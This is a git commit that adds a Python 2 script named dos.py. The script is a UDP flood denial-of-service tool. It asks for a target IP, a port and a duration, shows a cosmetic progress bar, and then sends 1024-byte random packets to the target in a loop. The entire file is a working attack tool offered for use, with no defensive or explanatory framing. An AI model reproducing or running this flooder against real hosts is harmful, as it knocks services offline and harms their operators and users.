dc73daa2ac570d8b3ec4d2bcee1222675ee915c0
H4CK6R SPY <71980380+vjkingler@users.noreply.github.com>
2021-01-19 15:35:11 +0530

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,51 @@
+#!/usr/python
+
+#colour codes
+
+
+import os
+import sys
+import time
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+os.system("clear")
+os.system("figlet WELCOME TO DOS ATTACK ")
+print("")
+ip = raw_input("\033[32;1m" "figlet aTarget IP : ")
+port = input("\033[32;1m" "port : ")
+dur = input("\033[32;1m" "Time : ")
+timeout = time.time() + dur
+print "[                    ] 0% "
+time.sleep(2)
+print "[=====               ] 25%"
+time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(4)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+
+
+
+
+while True:
+ 
+                try:
+
+                             if time.time() > timeout:
+                                            break
+                             else:
+                                            pass
+                             sock.sendto(str(bytes),( str(ip), port))                             
+                             sent = sent +1
+                             print "Sent %s packets to %s through port %s"%(sent, ip, port)
+                except KeyboardInterrupt:
+                             sys.exit()
+
+
+
